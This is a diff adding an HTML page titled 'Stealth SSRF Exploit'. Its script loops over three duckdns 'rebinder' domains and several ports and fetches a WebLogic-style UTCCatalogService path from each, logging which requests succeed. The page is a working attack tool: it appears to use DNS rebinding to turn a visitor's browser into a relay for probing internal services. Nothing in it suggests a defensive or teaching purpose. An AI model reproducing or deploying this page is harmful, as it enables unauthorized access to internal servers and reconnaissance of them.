@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>SSRF Relay</title></head>
+<body>
+  <h1>Stealth SSRF Exploit</h1>
+  <pre id="log"></pre>
+  <script>
+    const rebinderDomains = [
+      'ssrf1.duckdns.org',
+      'ssrf2.duckdns.org',
+      'ssrf3.duckdns.org'
+    ];
+    const ports = [7001, 7002, 8001, 8003, 9001];
+    const path = '/ws_utc/services/UTCCatalogService';
+    const log = document.getElementById("log");
+
+    for (const rebinder of rebinderDomains) {
+      for (const port of ports) {
+        const url = `http://${rebinder}:${port}${path}`;
+        fetch(url).then(r => r.text()).then(data => {
+          log.innerText += `✅ SSRF Success: ${url}\n`;
+        }).catch(e => {
+          log.innerText += `❌ SSRF Failed: ${url} → ${e.message}\n`;
+        });
+      }
+    }
+  </script>
+</body>
+</html>
